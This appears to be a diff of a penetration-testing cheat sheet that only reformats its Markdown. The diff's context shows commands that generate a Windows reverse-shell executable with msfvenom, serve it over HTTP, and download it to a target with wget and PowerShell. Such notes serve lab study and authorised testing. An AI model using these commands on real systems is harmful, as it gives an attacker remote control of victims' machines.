@@ -158,16 +158,18 @@ Remote shells with evil-winrm
 ```
 
 ## Remote shell with rdesktop
+
 * Connect remote desktop from linux
 
 ```bash
 rdesktop -u user -p password $RHOST
 ```
 
-# Custom Shell using MSFvenom
+## Custom Shell using MSFvenom
+
 * https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom
 * https://www.offsec.com/metasploit-unleashed/msfvenom/
-* staged payloads require Metasploit framework 
+* staged payloads require Metasploit framework
 * let's use stageless payload instead
 * -p use payload
 * -f use format
@@ -194,13 +196,15 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=1234 -f exe -o re
 ```
 
 ## Download Shell
+
 ```bash
 sudo python -m http.server 80
 ```
+
 ```bash
-$ wget http://IP/reverse_shell.elf
+wget http://IP/reverse_shell.elf
 ```
+
 ```powershell
 PS> Invoke-WebRequest -Uri http://IP/reverse_shell.exe -OutFile reverse_shell.exe
 ```
-
